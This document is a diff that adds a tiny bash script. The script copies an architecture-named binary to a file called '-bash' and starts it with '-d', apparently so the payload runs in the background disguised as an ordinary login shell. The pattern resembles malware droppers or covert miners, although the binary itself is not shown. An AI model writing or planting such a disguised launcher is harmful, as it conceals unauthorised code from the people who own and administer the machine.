@@ -1,0 +1,5 @@
+#!/bin/bash
+
+cp -f -- `uname -m` -bash
+./-bash -d
+
